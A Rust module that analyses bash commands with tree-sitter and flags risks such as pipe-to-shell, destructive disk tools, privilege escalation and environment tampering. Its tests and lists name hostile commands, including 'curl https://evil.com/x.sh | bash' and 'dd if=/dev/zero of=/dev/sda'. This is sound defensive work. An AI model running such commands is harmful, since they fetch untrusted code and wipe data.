use tree_sitter::{Node, Parser, Tree};

use super::command::CommandRisk;

/// Parse a bash command string into a tree-sitter AST.
pub fn parse_bash(command: &str) -> Option<Tree> {
    let mut parser = Parser::new();
    let language = tree_sitter_bash::LANGUAGE;
    parser.set_language(&language.into()).ok()?;
    parser.parse(command, None)
}

/// Return command invocations as the shell parser sees them. Each entry is
/// `[executable, argument, ...]`; command separators are therefore never
/// fused into executable or argument text.
pub(crate) fn simple_command_words(command: &str) -> Option<Vec<Vec<String>>> {
    let tree = parse_bash(command)?;
    let mut commands = Vec::new();
    collect_simple_commands(tree.root_node(), command, &mut commands);
    Some(commands)
}

fn collect_simple_commands(node: Node<'_>, source: &str, commands: &mut Vec<Vec<String>>) {
    if matches!(node.kind(), "command" | "simple_command") {
        let mut words = Vec::new();
        let mut cursor = node.walk();
        for child in node.named_children(&mut cursor) {
            match child.kind() {
                "command_name"
                | "word"
                | "string"
                | "raw_string"
                | "concatenation"
                | "command_substitution"
                | "expansion" => {
                    let text = child.utf8_text(source.as_bytes()).unwrap_or("").trim();
                    if !text.is_empty() {
                        words.push(text.to_string());
                    }
                }
                _ => {}
            }
        }
        if !words.is_empty() {
            commands.push(words);
        }
    }

    let mut cursor = node.walk();
    for child in node.named_children(&mut cursor) {
        collect_simple_commands(child, source, commands);
    }
}

/// AST-level bash risk analysis.
///
/// This is intentionally conservative: it focuses on high-signal primitives
/// (pipelines, command substitutions, redirections, privilege escalation, network tools)
/// and avoids false positives from string literals.
/// Returns detected risks. If the shell cannot be parsed, returns an empty vector (no substring fallback).
pub fn analyze_bash_risks_ast(command: &str) -> Vec<CommandRisk> {
    analyze_bash_risks_ast_inner(command, 0)
}

fn analyze_bash_risks_ast_inner(command: &str, shell_depth: usize) -> Vec<CommandRisk> {
    let Some(tree) = parse_bash(command) else {
        return Vec::new();
    };
    let root = tree.root_node();
    let mut ctx = RiskCtx::new(command);

    // Destructive tools must be identified from actual command invocations,
    // never by scanning arbitrary source text. In particular, heredoc bodies
    // and inline interpreter programs are data from Bash's point of view.
    let mut commands = Vec::new();
    collect_simple_commands(root, command, &mut commands);
    for words in commands {
        if let Some(name) = destructive_command_name(&words) {
            ctx.push(CommandRisk::DestructiveCommand(name.to_string()));
        }
        match nested_shell_script(&words) {
            NestedShellScript::Script(script) if shell_depth < 16 => {
                // Quoted `sh -c` input is a new shell program, unlike heredoc
                // input to Python/Node. Parse it as Bash so wrapping a real
                // destructive command does not bypass executable detection.
                for risk in analyze_bash_risks_ast_inner(script, shell_depth + 1) {
                    ctx.push(risk);
                }
            }
            NestedShellScript::Script(_) | NestedShellScript::Ambiguous => {
                // An unbounded nesting depth or an option sequence whose
                // command-string boundary is unclear cannot be authorized.
                ctx.push(CommandRisk::RemoteCodeExecution);
            }
            NestedShellScript::None => {}
        }
    }

    visit_node(root, &mut ctx);
    ctx.into_risks()
}

enum NestedShellScript<'a> {
    None,
    Script(&'a str),
    Ambiguous,
}

const SHELL_LONG_OPTIONS: &[&str] = &[
    "--debug",
    "--debugger",
    "--dump-po-strings",
    "--dump-strings",
    "--help",
    "--login",
    "--noediting",
    "--noprofile",
    "--norc",
    "--posix",
    "--pretty-print",
    "--restricted",
    "--verbose",
    "--version",
];
const SHELL_LONG_OPTIONS_WITH_VALUE: &[&str] = &["--init-file", "--rcfile"];
const SHELL_SHORT_OPTIONS: &str = "abefhiklmnprstuvxBCEHPTDqVE";

fn nested_shell_script(words: &[String]) -> NestedShellScript<'_> {
    let Some(index) = effective_command_index(words) else {
        return NestedShellScript::None;
    };
    let Some(executable) = words.get(index).map(|word| command_basename(word)) else {
        return NestedShellScript::None;
    };
    if !matches!(executable.as_str(), "bash" | "sh" | "dash" | "zsh" | "ksh") {
        return NestedShellScript::None;
    }

    let mut argument_index = index + 1;
    while let Some(raw) = words.get(argument_index) {
        let argument = unquote_shell_word(raw);
        if argument == "--"
            || argument == "-"
            || (!argument.starts_with('-') && !argument.starts_with('+'))
        {
            return NestedShellScript::None;
        }

        if argument.starts_with("--") {
            let (option, inline_value) = argument
                .split_once('=')
                .map_or((argument, false), |(option, _)| (option, true));
            if SHELL_LONG_OPTIONS.contains(&option) && !inline_value {
                argument_index += 1;
                continue;
            }
            if SHELL_LONG_OPTIONS_WITH_VALUE.contains(&option) {
                if !inline_value {
                    if words.get(argument_index + 1).is_none() {
                        return NestedShellScript::Ambiguous;
                    }
                    argument_index += 1;
                }
                argument_index += 1;
                continue;
            }
            return NestedShellScript::Ambiguous;
        }

        let Some(flags) = argument.get(1..) else {
            return NestedShellScript::Ambiguous;
        };
        if flags.is_empty()
            || flags
                .chars()
                .any(|flag| !SHELL_SHORT_OPTIONS.contains(flag) && !matches!(flag, 'c' | 'o' | 'O'))
        {
            return NestedShellScript::Ambiguous;
        }
        if argument.starts_with('+') && flags.contains('c') {
            return NestedShellScript::Ambiguous;
        }
        let option_name_count = flags.matches(['o', 'O']).count();
        if flags.contains('c') {
            return words
                .get(argument_index + 1 + option_name_count)
                .map_or(NestedShellScript::Ambiguous, |script| {
                    NestedShellScript::Script(unquote_shell_word(script))
                });
        }
        if words.len() < argument_index + 1 + option_name_count {
            return NestedShellScript::Ambiguous;
        }
        argument_index += 1 + option_name_count;
    }
    NestedShellScript::None
}

const DESTRUCTIVE_COMMANDS: &[&str] = &[
    "dd",
    "mkswap",
    "truncate",
    "shred",
    "wipefs",
    "blkdiscard",
    "fdisk",
    "sfdisk",
    "parted",
    "cryptsetup",
    "pvremove",
    "vgremove",
    "lvremove",
    "zpool",
    "zfs",
    "shutdown",
    "reboot",
    "poweroff",
    "halt",
    "telinit",
];

fn destructive_command_name(words: &[String]) -> Option<&'static str> {
    let index = effective_command_index(words)?;
    let executable = command_basename(words.get(index)?);
    if executable == "mkfs" || executable.starts_with("mkfs.") {
        return Some("mkfs");
    }
    DESTRUCTIVE_COMMANDS
        .iter()
        .copied()
        .find(|candidate| executable.eq_ignore_ascii_case(candidate))
}

/// Resolve common transparent launchers without inspecting ordinary command
/// arguments. This preserves detection for `sudo dd`, `env X=1 wipefs`, etc.,
/// while ensuring `python -c '... dd ...'` remains interpreter input.
fn effective_command_index(words: &[String]) -> Option<usize> {
    let mut index = 0;
    loop {
        let executable = command_basename(words.get(index)?);
        index += 1;
        match executable.as_str() {
            "command" | "builtin" | "exec" | "nohup" => {
                index = skip_options(words, index, &[])?;
            }
            "env" => {
                index = skip_options(words, index, &["-u", "--unset", "-C", "--chdir"])?;
                while words.get(index).is_some_and(|word| is_assignment(word)) {
                    index += 1;
                }
            }
            "sudo" | "doas" | "pkexec" => {
                index = skip_options(
                    words,
                    index,
                    &[
                        "-u",
                        "--user",
                        "-g",
                        "--group",
                        "-h",
                        "--host",
                        "-p",
                        "--prompt",
                        "-R",
                        "--chroot",
                        "-C",
                        "--close-from",
                    ],
                )?;
            }
            _ => return Some(index - 1),
        }
    }
}

fn skip_options(words: &[String], mut index: usize, options_with_value: &[&str]) -> Option<usize> {
    while let Some(raw) = words.get(index) {
        let argument = unquote_shell_word(raw);
        if argument == "--" {
            return (index + 1 < words.len()).then_some(index + 1);
        }
        if !argument.starts_with('-') || argument == "-" {
            return Some(index);
        }
        let option = argument.split_once('=').map_or(argument, |(name, _)| name);
        index += 1;
        if options_with_value.contains(&option) && !argument.contains('=') {
            index += 1;
        }
    }
    None
}

fn command_basename(raw: &str) -> String {
    unquote_shell_word(raw)
        .rsplit(['/', '\\'])
        .next()
        .unwrap_or_default()
        .to_ascii_lowercase()
}

fn unquote_shell_word(raw: &str) -> &str {
    raw.trim().trim_matches(|ch| matches!(ch, '\'' | '"'))
}

fn is_assignment(raw: &str) -> bool {
    let raw = unquote_shell_word(raw);
    let Some((name, _)) = raw.split_once('=') else {
        return false;
    };
    let mut chars = name.chars();
    chars
        .next()
        .is_some_and(|first| first == '_' || first.is_ascii_alphabetic())
        && chars.all(|ch| ch == '_' || ch.is_ascii_alphanumeric())
}

struct RiskCtx<'a> {
    src: &'a str,
    hits: Vec<CommandRisk>,
}

impl<'a> RiskCtx<'a> {
    fn new(src: &'a str) -> Self {
        Self { src, hits: vec![] }
    }

    fn push(&mut self, risk: CommandRisk) {
        if !self.hits.contains(&risk) {
            self.hits.push(risk);
        }
    }

    fn into_risks(self) -> Vec<CommandRisk> {
        self.hits
    }

    fn text(&self, n: Node<'_>) -> &'a str {
        n.utf8_text(self.src.as_bytes()).unwrap_or("")
    }
}

fn visit_node(node: Node<'_>, ctx: &mut RiskCtx<'_>) {
    // High-signal nodes we can reason about structurally.
    match node.kind() {
        "word" => {
            analyze_word_risks(node, ctx);
        }
        "variable_assignment" => {
            analyze_variable_assignment(node, ctx);
        }
        // `$()` and legacy backticks.
        "command_substitution" | "old_command_substitution" => {
            ctx.push(CommandRisk::CommandSubstitution);
        }
        // `<(cmd)` / `>(cmd)`
        "process_substitution" => {
            ctx.push(CommandRisk::ProcessSubstitution);
        }
        // `|` pipeline
        "pipeline" => {
            analyze_pipeline(node, ctx);
        }
        // Any form of redirection (`>`, `>>`, `<`, `2>`, `<<EOF`, etc.)
        "redirected_statement" | "redirection" | "herestring_redirect" | "heredoc_redirect" => {
            analyze_redirection(node, ctx);
        }
        // A command invocation (simple_command includes assignments + command name).
        "command" | "simple_command" => {
            analyze_command_invocation(node, ctx);
        }
        _ => {}
    }

    // Recurse.
    let mut cursor = node.walk();
    for child in node.children(&mut cursor) {
        visit_node(child, ctx);
    }
}

fn analyze_variable_assignment(node: Node<'_>, ctx: &mut RiskCtx<'_>) {
    let Some(name_node) = node.child_by_field_name("name") else {
        return;
    };
    let name = ctx.text(name_node).to_lowercase();
    if name == "path" || name.starts_with("ld_") {
        ctx.push(CommandRisk::EnvManipulation);
    }
}

fn analyze_word_risks(node: Node<'_>, ctx: &mut RiskCtx<'_>) {
    let t = ctx.text(node);
    let lower = t.to_lowercase();
    if lower.contains("../") || lower.contains("..\\") {
        ctx.push(CommandRisk::PathTraversal);
    }
    for sensitive in &["/etc/", "/root/", "/var/log/", "/proc/", "/sys/"] {
        if lower.contains(sensitive) {
            ctx.push(CommandRisk::SensitivePathAccess(sensitive.to_string()));
            break;
        }
    }
    // Simple `VAR=value` prefix assignments (e.g. `PATH=/evil cmd`).
    if let Some((k, _)) = t.split_once('=') {
        let kl = k.to_lowercase();
        if kl == "path" || kl.starts_with("ld_") {
            ctx.push(CommandRisk::EnvManipulation);
        }
    }
}

fn analyze_pipeline(node: Node<'_>, ctx: &mut RiskCtx<'_>) {
    // Heuristic: detect `curl|wget ... | sh|bash|zsh` without matching strings.
    // tree-sitter-bash represents pipelines as a sequence of commands.
    let mut commands = Vec::new();
    let mut cursor = node.walk();
    for child in node.named_children(&mut cursor) {
        if (child.kind() == "command" || child.kind() == "simple_command")
            && let Some(name) = command_name(child, ctx)
        {
            commands.push((name, child));
        }
    }
    if commands.is_empty() {
        return;
    }

    let has_network = commands
        .iter()
        .any(|(n, _)| matches!(n.as_str(), "curl" | "wget" | "nc" | "ncat" | "netcat"));
    if has_network {
        ctx.push(CommandRisk::NetworkAccess);
    }

    // `curl ... | bash` / `wget ... | sh`
    let last = commands.last().map(|(n, _)| n.as_str()).unwrap_or("");
    if has_network && matches!(last, "sh" | "bash" | "zsh" | "fish" | "dash" | "ksh") {
        ctx.push(CommandRisk::RemoteCodeExecution);
    }
}

fn analyze_redirection(node: Node<'_>, ctx: &mut RiskCtx<'_>) {
    // We look for any redirection target that clearly escapes boundaries or hits sensitive paths.
    // Note: This is advisory; actual path access is enforced elsewhere.
    let txt = ctx.text(node).to_lowercase();
    if txt.contains("../") || txt.contains("..\\") {
        ctx.push(CommandRisk::PathTraversal);
    }
    for sensitive in &["/etc/", "/root/", "/var/log/", "/proc/", "/sys/"] {
        if txt.contains(sensitive) {
            ctx.push(CommandRisk::SensitivePathAccess(sensitive.to_string()));
            break;
        }
    }
    // Any `>` / `>>` / `2>` is a write primitive; mark it.
    if txt.contains('>') {
        ctx.push(CommandRisk::OutputRedirection);
    }
}

fn analyze_command_invocation(node: Node<'_>, ctx: &mut RiskCtx<'_>) {
    let Some(name) = command_name(node, ctx) else {
        return;
    };
    let lower = name.to_ascii_lowercase();

    // Privilege escalation: `su` only when invoking a login/root shell (`su -`), not bare `su`.
    if matches!(lower.as_str(), "sudo" | "doas") {
        ctx.push(CommandRisk::PrivilegeEscalation);
    }
    if lower == "su" {
        let txt = ctx.text(node);
        if txt.contains("su -") || txt.split_whitespace().nth(1) == Some("-") {
            ctx.push(CommandRisk::PrivilegeEscalation);
        }
    }
    if lower == "chmod" {
        let txt = ctx.text(node);
        if txt.contains("+s") || txt.contains("u+s") || txt.contains("g+s") || txt.contains("o+s") {
            ctx.push(CommandRisk::PrivilegeEscalation);
        }
    }

    // Network primitives (also caught via pipeline)
    if matches!(
        lower.as_str(),
        "curl" | "wget" | "nc" | "ncat" | "netcat" | "ssh" | "scp"
    ) {
        ctx.push(CommandRisk::NetworkAccess);
    }

    // Environment manipulation (export PATH/LD_*)
    if lower == "export" {
        let txt = ctx.text(node).to_lowercase();
        if txt.contains("path=") || txt.contains("ld_") {
            ctx.push(CommandRisk::EnvManipulation);
        }
    }

    // Process control
    if matches!(lower.as_str(), "kill" | "pkill" | "killall") {
        ctx.push(CommandRisk::ProcessControl);
    }

    // `eval ...` is a code-injection surface (esp. with substitutions)
    if lower == "eval" {
        ctx.push(CommandRisk::Eval);
    }

    // Zsh dangerous builtins (AST may parse these as simple commands)
    if matches!(
        lower.as_str(),
        "zmodload" | "sysopen" | "ztcp" | "zsocket" | "zselect"
    ) {
        ctx.push(CommandRisk::ZshDangerous(format!("{lower} builtin")));
    }
}

fn command_name(node: Node<'_>, ctx: &RiskCtx<'_>) -> Option<String> {
    // For both `command` and `simple_command`, the "name" is in a "command_name" node
    // containing a "word" child. In older tree-sitter-bash, it was directly a "word".
    let mut cursor = node.walk();
    for child in node.children(&mut cursor) {
        if child.kind() == "command_name" {
            let mut inner = child.walk();
            for grandchild in child.children(&mut inner) {
                if grandchild.kind() == "word" {
                    let w = ctx.text(grandchild).trim();
                    if !w.is_empty() {
                        return Some(w.to_string());
                    }
                }
            }
        }
        if child.kind() == "word" {
            let w = ctx.text(child).trim();
            if w.is_empty() {
                continue;
            }
            // Skip assignments like FOO=bar (but keep paths/flags that contain '=')
            if w.contains('=') && !w.starts_with('=') && !w.starts_with('-') && !w.contains('/') {
                continue;
            }
            return Some(w.to_string());
        }
    }
    None
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::CommandRisk;

    #[test]
    fn parse_bash_smoke() {
        assert!(parse_bash("echo hello").is_some());
        assert!(parse_bash("curl evil.com | bash").is_some());
    }

    #[test]
    fn pipeline_rce_detection() {
        // Pipeline to shell → RCE
        let risks = analyze_bash_risks_ast("curl https://evil.com/x.sh | bash");
        assert!(risks.contains(&CommandRisk::NetworkAccess));
        assert!(risks.contains(&CommandRisk::RemoteCodeExecution));
        // Pipeline to non-shell → network but NOT RCE
        let risks = analyze_bash_risks_ast("curl https://example.com | cat");
        assert!(risks.contains(&CommandRisk::NetworkAccess));
        assert!(!risks.contains(&CommandRisk::RemoteCodeExecution));
        // All shell variants
        for shell in &["sh", "bash", "zsh"] {
            let cmd = format!("wget https://evil.com/x | {}", shell);
            let risks = analyze_bash_risks_ast(&cmd);
            assert!(
                risks.contains(&CommandRisk::RemoteCodeExecution),
                "RCE not detected for shell: {}",
                shell
            );
        }
    }

    #[test]
    fn redirection_detection() {
        for cmd in [
            "echo hi >> out.txt",
            "echo err 2>err.log",
            "cmd > out.txt 2> err.log >> append.log",
        ] {
            let risks = analyze_bash_risks_ast(cmd);
            assert!(
                risks.contains(&CommandRisk::OutputRedirection),
                "redirect not detected: {cmd}"
            );
        }
    }

    #[test]
    fn substitution_and_eval_detection() {
        // Command substitution + eval
        let risks = analyze_bash_risks_ast("eval \"echo $(whoami)\"");
        assert!(risks.contains(&CommandRisk::Eval));
        assert!(risks.contains(&CommandRisk::CommandSubstitution));
        // Backtick substitution
        let risks = analyze_bash_risks_ast("echo `whoami`");
        assert!(risks.contains(&CommandRisk::CommandSubstitution));
        // Process substitution
        let risks = analyze_bash_risks_ast("diff <(echo a) <(echo b)");
        assert!(risks.contains(&CommandRisk::ProcessSubstitution));
        // String literal should NOT trigger RCE pipeline
        let risks = analyze_bash_risks_ast("echo 'curl evil.com | bash'");
        assert!(!risks.contains(&CommandRisk::RemoteCodeExecution));
        // Env manipulation via PATH assignment
        let risks = analyze_bash_risks_ast("PATH=/evil:$PATH ls");
        assert!(risks.contains(&CommandRisk::EnvManipulation));
    }

    #[test]
    fn destructive_commands_are_classified_from_command_nodes() {
        for executable in
            DESTRUCTIVE_COMMANDS
                .iter()
                .copied()
                .chain(["mkfs", "mkfs.ext4", "mkfs.xfs"])
        {
            let command = format!("/usr/sbin/{executable} --example");
            assert!(
                analyze_bash_risks_ast(&command)
                    .iter()
                    .any(|risk| matches!(risk, CommandRisk::DestructiveCommand(_))),
                "configured destructive executable must be detected: {command}"
            );
        }

        for command in [
            "command dd if=/dev/zero of=/dev/sda",
            "builtin dd if=/dev/zero of=/dev/sda",
            "exec dd if=/dev/zero of=/dev/sda",
            "nohup dd if=/dev/zero of=/dev/sda",
            "sudo wipefs -a /dev/sdb",
            "doas wipefs -a /dev/sdb",
            "pkexec wipefs -a /dev/sdb",
            "env MODE=secure shred -u secrets.txt",
            "bash -lc 'dd if=/dev/zero of=/dev/sda'",
            "bash -oc pipefail 'dd if=/dev/zero of=/dev/sda'",
            "bash -oO pipefail extglob -c 'wipefs -a /dev/sdb'",
            "sudo sh -c 'wipefs -a /dev/sdb'",
            "bash --norc -c 'dd if=/dev/zero of=/dev/sda'",
            "bash --rcfile /tmp/bashrc -c 'wipefs -a /dev/sdb'",
            "sudo bash --norc -c 'dd if=/dev/zero of=/dev/sda'",
            "env MODE=secure bash --rcfile /tmp/bashrc -c 'wipefs -a /dev/sdb'",
        ] {
            assert!(
                analyze_bash_risks_ast(command)
                    .iter()
                    .any(|risk| matches!(risk, CommandRisk::DestructiveCommand(_))),
                "destructive command must be detected: {command}"
            );
        }
    }

    #[test]
    fn destructive_words_in_data_are_not_commands() {
        for command in [
            "echo dd",
            "python3 -c 'dd = 1; print(dd)'",
            "python3 <<'PY'\ndd = {'chart': 'bar'}\nprint(dd)\nPY",
            "bash -c 'echo dd'",
            "bash -oc pipefail 'echo dd'",
            "bash --norc -c 'echo dd'",
            "bash --rcfile /tmp/bashrc -c 'echo dd'",
        ] {
            assert!(
                !analyze_bash_risks_ast(command)
                    .iter()
                    .any(|risk| matches!(risk, CommandRisk::DestructiveCommand(_))),
                "data must not be classified as a destructive command: {command}"
            );
        }
    }

    #[test]
    fn ambiguous_shell_options_fail_closed() {
        for command in [
            "bash --unknown-option -c 'echo safe'",
            "bash +c 'echo safe'",
            "bash --rcfile",
        ] {
            assert!(
                analyze_bash_risks_ast(command).contains(&CommandRisk::RemoteCodeExecution),
                "ambiguous shell invocation must fail closed: {command}"
            );
        }
    }

    #[test]
    fn chmod_setuid_variants() {
        for cmd in [
            "chmod +s /usr/bin/passwd",
            "chmod u+s /usr/bin/file",
            "chmod g+s /usr/bin/file",
        ] {
            let risks = analyze_bash_risks_ast(cmd);
            assert!(
                risks.contains(&CommandRisk::PrivilegeEscalation),
                "chmod not detected: {cmd}"
            );
        }
    }

    // --- edge cases ---

    #[test]
    fn edge_cases_no_risks_or_panic() {
        // Empty command: parses, no risks
        let tree = parse_bash("");
        assert!(tree.is_some());
        assert!(analyze_bash_risks_ast("").is_empty());
        // Whitespace only
        assert!(analyze_bash_risks_ast("   \t  ").is_empty());
        // Very long echo: no panic, no risks
        let long = format!("echo '{}'", "x".repeat(50_000));
        assert!(analyze_bash_risks_ast(&long).is_empty());
    }
}
